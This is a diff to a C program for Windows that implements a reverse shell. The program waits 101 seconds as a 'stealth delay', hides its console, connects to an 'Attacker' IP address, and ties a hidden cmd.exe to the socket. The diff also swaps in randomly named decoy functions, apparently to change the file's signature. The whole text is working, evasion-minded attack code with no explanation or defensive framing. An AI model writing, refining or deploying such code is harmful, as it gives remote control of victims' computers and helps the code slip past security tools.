@@ -6,50 +6,52 @@
 #pragma comment(lib, "ws2_32.lib")
 
 
-void IuBaFifT() {
-    int x = 429;
-    int y = 637;
+void eVQEVHqP() {
+    int x = 464;
+    int y = 320;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void AcEQdAin() {
-    int x = 748;
-    int y = 943;
+void KcWyhlNs() {
+    int x = 52;
+    int y = 391;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void QHWzpAeo() {
-    int x = 758;
-    int y = 522;
+void GRdnEAWs() {
+    int x = 931;
+    int y = 906;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void BTLZWCug() {
-    int x = 104;
-    int y = 842;
+void CHhSKRUv() {
+    int x = 899;
+    int y = 153;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-void VVxxTNbw() {
-    int x = 433;
-    int y = 586;
+void IQuSrIUT() {
+    int x = 903;
+    int y = 816;
     if (x + y > 2000) { printf("%d", x); }
 }
 
 
-int main() {
-    // 1. STEALTH DELAY (101 Seconds)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    FreeConsole();
+    // STEALTH DELAY (101 Seconds)
     Sleep(101000); 
 
-    // 2. WINSOCK STARTUP
+    // WINSOCK STARTUP
     WSADATA wsaData;
     WSAStartup(MAKEWORD(2,2), &wsaData);
 
-    // 3. CREATE WINDOWS SOCKET
+    // CREATE WINDOWS SOCKET
     SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     
     struct sockaddr_in serv_addr;
@@ -59,7 +61,7 @@ int main() {
     // This is your Mac's IP address (the Attacker)
     serv_addr.sin_addr.s_addr = inet_addr("192.168.64.1");
 
-    // 4. CONNECT BACK TO MAC
+    // CONNECT BACK TO MAC
     if (WSAConnect(sock, (SOCKADDR*)&serv_addr, sizeof(serv_addr), NULL, NULL, NULL, NULL) == 0) {
         STARTUPINFOA si = {0};
         PROCESS_INFORMATION pi = {0};
@@ -70,7 +72,7 @@ int main() {
         si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
 
         char cmd[] = "cmd.exe"; 
-        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+        CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     }
     return 0;
 }
